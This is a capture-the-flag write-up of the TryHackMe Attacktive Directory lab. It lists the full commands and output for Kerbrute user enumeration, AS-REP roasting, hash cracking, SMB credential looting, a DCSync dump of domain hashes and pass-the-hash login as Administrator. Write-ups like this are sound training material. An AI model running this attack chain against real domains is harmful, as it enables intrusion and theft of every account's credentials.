Attacktive Directory is a TryHackMe machine that simulates a real Active Directory environment to practice enumeration and attack techniques. It allows the use of tools like Nmap, Kerbrute, and SMBclient to obtain credentials and exploit services. It is ideal for learning real-world steps to compromise a Windows domain.

## 🕵️‍♂️ Enumeration

To start the reconnaissance phase, we performed a basic port scan using Nmap against the target machine 10.64.147.141.  
The purpose of this scan is to identify open ports and exposed active services, which will allow us to define initial attack paths.

```
nmap -p- --open -Pn -n -sS --min-rate 5000 -vvv -oN Scan <IP>
```

Output:

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
80/tcp    open  http             syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
47001/tcp open  winrm            syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49665/tcp open  unknown          syn-ack ttl 126
49666/tcp open  unknown          syn-ack ttl 126
49668/tcp open  unknown          syn-ack ttl 126
49669/tcp open  unknown          syn-ack ttl 126
49671/tcp open  unknown          syn-ack ttl 126
49672/tcp open  unknown          syn-ack ttl 126
49677/tcp open  unknown          syn-ack ttl 126
49687/tcp open  unknown          syn-ack ttl 126
49690/tcp open  unknown          syn-ack ttl 126
49701/tcp open  unknown          syn-ack ttl 126
```

---

## 🔎 Filtering the obtained ports

After the initial scan, we noticed that the output contains a considerable amount of ports and additional data we do not need.  
To simplify the information and work only with open ports, we filtered the output to extract just the port numbers and present them in a clean and readable format.  
We used a combination of tools (sed, cut, paste, or tr) to keep only the first column of each line — the one containing the port — and format it as CSV (comma-separated values).

Method 1 – using paste

```
batcat -l java port | sed -n "8,34p" | cut -d"/" -f1 | paste -sd,

```

Result:

```
53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49671,49672,49677,49687,49690,49701

```

---

Method 2 – using tr and sed

```
batcat -l java port | sed -n "8,34p" | cut -d"/" -f1 | tr '\n' ',' | sed 's/,$//'

```

Result:

```
53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49671,49672,49677,49687,49690,49701

```

 Both methods achieve the same goal: extract only the port numbers and remove all irrelevant content, generating a clean list that will make later enumeration easier.

## 1.1 Enumeration

In this phase, we go deeper into information gathering, focusing on the services and characteristics exposed by the previously identified ports. For this, we use Nmap again, since this tool provides a wide collection of NSE (Nmap Scripting Engine) scripts specifically designed to perform advanced enumeration tasks.  
These scripts allow us to obtain additional details about running services, versions, configurations, authentication mechanisms, and possible attack vectors present on the target system.  
The goal of this section is to enrich our understanding of the environment, identify vulnerable or outdated services, and gather all useful information for the next exploitation phase.

```
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49671,49672,49677,49687,49690,49701  -sSVC -Pn -n --min-rate 5000 -vvv -oN port_script 10.64.131.60
```

Result:

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-25 20:51:21Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-11-25T20:52:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-24T20:21:38
| Not valid after:  2026-05-26T20:21:38
| MD5:   2794:abed:ad40:b70d:4e5f:012c:3c7b:d1a0
| SHA-1: cd83:f903:9902:1cde:e5bd:3291:81bc:7026:f1fa:9348
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQdzb22dGj/bdMeiBnRvvYpDANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yNTExMjQyMDIxMzhaFw0yNjA1MjYyMDIxMzhaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEApK1FZwHDfYTqF547vg9qubQH2+CnLy76S6zuDqiJs0q3
| +XIr7osnCn3TNBbe4OLeCMM1hrtzwxkI3RZSi4QZ76IYR9/B9JDvGSO+E/1yw/FE
| NZYKrbmMCE9zIVL7igbj6lG+QChe6Kr+q1P/FYKwvCBMj367BX/kA5zPHJIfcjOo
| 1P1I95XhJehV45fcgtOiOCzNMx2owEoL83Gna9lWJf7ux1z9+JvTgczsRFzQbV7D
| RDXdJtr6Ndg05wmLjbb5/JjfFWg3u/+nVQVGBHO+wPAyDtEqhDIRBYbsy0+vudNy
| BWQpCb/eR/STtQ+kVWtQCYStHEng/vbqgacEGKHXgQIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAFZI
| LpE06D0mFpRK5DHb0CKhfbkJVGMcfgj2zpZf+37gSz9sznttYqYvL+n7xyEdA/CR
| rFEbHD08CoDMAYpnbqjBpof93i+cqHKUeEO22n2TnV9ltgoH6oXnYILR+Pf5bmXV
| Pk/FgAJ24EKr8S54MXCjdEtETq62o4nDGw5Pmek7aagzgy0gqGOLCJHtXTjJasNb
| nsf4ApRWwPkXs6vKWEkwJhE7B1W2DBm1J7WN1yZ24XdYFRlz7eQbdtnT9qxc5Dl2
| Q6tXCnXzVektzyoEZJjnQjtdH9YZbg5i8+KQ7c51fdeNLGSAixWkPMWO9xLq89JF
| lU7HpUg15/I66mxIHSE=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-25T20:52:18+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38462/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21426/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48375/udp): CLEAN (Failed to receive data)
|   Check 4 (port 58282/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-25T20:52:18
|_  start_date: N/A
```

Key data obtained during Nmap enumeration

Within the results provided by the NSE scripts, one of the most relevant was `rdp-ntlm-info`, which exposes critical information about the queried Windows environment:

```
rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-25T20:52:18+00:00

```

From this information we obtain essential details about the Active Directory environment, such as:

- Domain name (DNS Domain Name)
    
- Domain NetBIOS name (NetBIOS Domain Name)
    
- Host NetBIOS name (NetBIOS Computer Name)
    
- Host fully qualified DNS name (FQDN)
    

These elements will be fundamental in later phases, as they will allow more accurate enumeration of users, policies, and passwords, and will also facilitate interaction with services such as Kerberos, LDAP, SMB, or RDP during exploitation and privilege escalation.

We saved the domain names in the `/etc/hosts` file, since Active Directory depends on correct DNS name resolution to function properly. By registering the domain and the DC FQDN, we ensure tools can resolve them correctly and we avoid common errors such as those related to the KDC (Key Distribution Center) during Kerberos authentication.

```
10.64.131.60 spookysec.local AttacktiveDirectory.spookysec.local THM-AD
```

## 1.2 User enumeration with Kerbrute

At this stage, we are provided with a list of possible usernames along with a password list. However, for this procedure we focus only on the user list, with the goal of identifying which of them actually exist within the Active Directory domain.  
For this, we use Kerbrute, a tool designed to interact with the Kerberos service and validate usernames without knowing their passwords. This technique allows us to discover valid domain accounts by requesting TGTs (Ticket Granting Tickets), which is extremely useful to prepare for later attacks such as targeted brute force, AS-REP Roasting, or lateral movement.

We download the user list:

```
curl -LO https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  527k  100  527k    0     0  97289      0  0:00:05  0:00:05 --:--:--  140k
```

Once downloaded, we enumerate users with kerbrute:

```
kerbrute userenum -d spookysec.local --dc 10.64.131.60 userlist.txt
```

Result:

```

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/25/25 - Ronnie Flathers @ropnop

2025/11/25 16:20:36 >  Using KDC(s):
2025/11/25 16:20:36 >  	10.64.131.60:88

2025/11/25 16:20:37 >  [+] VALID USERNAME:	james@spookysec.local
2025/11/25 16:20:43 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2025/11/25 16:20:45 >  [+] VALID USERNAME:	James@spookysec.local
2025/11/25 16:20:46 >  [+] VALID USERNAME:	robin@spookysec.local
2025/11/25 16:21:05 >  [+] VALID USERNAME:	darkstar@spookysec.local
2025/11/25 16:21:16 >  [+] VALID USERNAME:	administrator@spookysec.local
2025/11/25 16:21:31 >  [+] VALID USERNAME:	backup@spookysec.local
2025/11/25 16:21:36 >  [+] VALID USERNAME:	paradox@spookysec.local
2025/11/25 16:22:07 >  [+] VALID USERNAME:	JAMES@spookysec.local
2025/11/25 16:22:18 >  [+] VALID USERNAME:	Robin@spookysec.local
2025/11/25 16:23:22 >  [+] VALID USERNAME:	Administrator@spookysec.local
2025/11/25 16:26:54 >  [+] VALID USERNAME:	Darkstar@spookysec.local
```

---

## 2. Exploitation
    

2.1 AS-REP Roasting

During initial enumeration we identified several domain users, including two administrative accounts: `svc-admin` and `Administrator`.  
With this information, we can execute an attack known as **AS-REP Roasting**.  
This attack is based on identifying accounts that have Kerberos pre-authentication disabled.  
When an account does not require pre-auth, it is possible to request an AS-REP response from the KDC that is encrypted only with the user’s password, without needing to authenticate first.  
This allows us to obtain a hash that can be cracked offline, without generating additional noise in AD and without requiring valid credentials within the domain.

We save the discovered users into a file:

```bash
cat user | cut -d":" -f4 > username

james@spookysec.local
svc-admin@spookysec.local
James@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
JAMES@spookysec.local
Robin@spookysec.local
Administrator@spookysec.local
Darkstar@spookysec.local
```

Now we use Impacket’s `GetNPUsers.py` tool to identify and enumerate domain users that have Kerberos pre-authentication disabled.

This script allows requesting an AS-REP message without valid credentials, as long as the account does not require pre-authentication.

When this occurs, the domain controller responds with an AS-REP encrypted with a key derived from the user’s password, which we can capture and store in a format compatible with tools like Hashcat for offline cracking.

```
python /home/kayrat/Escritorio/herramientas/buda/bin/GetNPUsers.py spookysec.local/ -usersfile username.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.60.131.64
```

Result

```bash
[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:4b99ec14c32022919173f9e688cf2612$4245b4cf6ad83f4009412ad2b87d081bb0d6c74ed5cab611f4af13c468b82b78c9872ad9ecc0a02fc7e73a6685bf532ddc66ff23cee653b9ba228911f8066cdbf9787214e48a557c6c2ab3042cb8ed7b988508f6b44f4acdf9de2648ac5cd42586871414928f3f14e8c87e7c10bedc4b85c2313d64e82038598780bc552e3fe1fb36092bc94986f8a9c5568ac3de2cab46e19642a99385c0ec55e8f00c487ab482a4dad246e451d1fac5d6644a3aa729fd7c72dd83d71b101eadca17b3db1b978679670af8dea03117b7244291636882c61f183d8685261d2f5a3ab567650d03b9629f1c6822afb51e177626ac534417b90b
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

As a result of the analysis performed with `GetNPUsers.py`, we identified that the user `svc-admin` is the only domain account with Kerberos pre-authentication disabled.

This means this account is vulnerable to the **AS-REP Roasting** attack, because the KDC allows us to obtain an encrypted AS-REP message without authenticating first.

From this AS-REP, we can extract a hash in a format compatible with tools like Hashcat and attempt to crack the password offline.

 Here is a fully improved, clear, technical, and professional version, ideal for your report or write-up:

## 2.2 Password Cracking

To proceed with cracking the hash obtained via AS-REP Roasting, we first download the dictionary provided by the lab, which contains a set of possible passwords used in this environment:

```bash
curl -LO https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

```

Once the dictionary is downloaded, we use John the Ripper (JTR) to attempt to decrypt the Kerberos hash extracted earlier. John supports the `krb5asrep` format, so it can crack these hashes quickly and efficiently.  
We run the following command:

```bash
john --wordlist=passwordlist.txt hash

```

After loading the hash and processing the dictionary, JTR successfully finds the password for the `svc-admin` account:

```powershell
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23)
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
Session completed.

```

As a result, the cracked password is:

management2005

---

## 3. SMB Enumeration
    

With valid credentials for the `svc-admin` account, we proceed to enumerate shared resources exposed by the server via the SMB (Server Message Block) protocol.  
For this, we use the `smbclient` tool, which allows us to list available shares and then access them to review their content.  
The first step is to list all SMB resources published by the target server:

```
 smbclient -L //10.64.131.60/ -U svc-admin
 
 Password for [WORKGROUP\svc-admin]:
```

Result:

```powershell
        Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

While enumerating the available SMB shares, we identified an unusual share named `backup`, which stands out because it is not a typical standard share in this environment.

We authenticated to this share using the `svc-admin` credentials, which allowed us to explore its contents.

```
 smbclient  //10.64.131.60/backup -U svc-admin 

Password for [WORKGROUP\svc-admin]:
```

Result:

```powershell
smb: \> ls
  .                                   D        0  Sat Apr  4 14:08:39 2020
  ..                                  D        0  Sat Apr  4 14:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 14:08:53 2020

		8247551 blocks of size 4096. 3596746 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

 Inside the directory we found a text file named `backup_credentials.txt`, whose name suggests it may contain sensitive information related to internal credentials or configurations. This type of finding is especially relevant during post-exploitation, since it often stores passwords, access keys, or information that can facilitate privilege escalation within the domain.

When reviewing the contents of `backup_credentials.txt`, we observed that the data was not in plain text, but encoded in Base64. This type of encoding is often used to superficially hide sensitive information, so we proceeded to decode it.  
Once decoded, the file revealed a set of credentials corresponding to an additional account within the domain:

```
backup@spookysec.local : backup2517860

```

---

## 4. Post-Exploitation
    

Now that we have new credentials, it is reasonable to assume this account may have higher privileges than what we initially had. The username `backup` already suggests a critical function within the domain environment.  
By analyzing its purpose, we can infer this account corresponds to the backup mechanism of the domain controller. In many environments, backup accounts have special permissions designed to synchronize or replicate sensitive Active Directory information as part of maintenance and backup tasks.  
In this case, the account `backup@spookysec.local` has a highly significant privilege:

it can synchronize all Active Directory objects and changes, including the password hashes of all domain accounts.

This type of permission is known as:

DS-Replication-Get-Changes

DS-Replication-Get-Changes-All

DS-Replication-Get-Changes-In-Filtered-Set

 These capabilities are the same ones a Domain Controller uses to replicate information between DCs. Therefore:

With these credentials, it is possible to perform a **DCSync attack**,

allowing us to extract NTLM hashes from any domain account, including:

- Standard users
    
- Service accounts
    
- Domain administrators
    
- Even the `krbtgt` account
    

This implies we are very close to full domain control.

Executing the DCSync attack with `secretsdump.py`

We use the `secretsdump.py` tool from Impacket to request replication of domain hashes:

```
impacket-secretsdump backup:backup2517860@10.64.131.60
```

Result:

```powershell
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b4df86db816b84b5d1abc6af78e91e68:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:a31e3933509322002252c0b93d065297621d02072d5a4d4b824cce889361fdb0
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:85aa04518239de0a211345b17c13dc50
ATTACKTIVEDIREC$:des-cbc-md5:3dd073df2a340dcd
[*] Cleaning up...
```

## 3.1 Authentication via Pass-the-Hash (PtH)

Once we obtained the NTLM hashes of domain users via the DCSync attack, we can authenticate without needing the plaintext passwords.  
For this, we use the technique known as **Pass-the-Hash (PtH)**, which allows us to use the NTLM hash directly as if it were the password, bypassing the normal Kerberos/NTLM authentication process.  
This technique is especially powerful because:

- It does not require cracking the hash
    
- It works with most Windows services
    
- It provides full access if the hash belongs to a domain administrator
    

With the NTLM hash of the `Administrator` user, we can authenticate to the target system and gain privileged access.

```
 evil-winrm -i 10.64.131.60  -H 0e0363213e37b94221497260b0bcb4fc -u Administrator
```

FLAGS

- svc-admin: TryHackMe{K3rb3r0s_Pr3_4uth}
    
- backup: TryHackMe{B4ckM3UpSc0tty!}
    
- Administrator: TryHackMe{4ctiveD1rectoryM4st3r}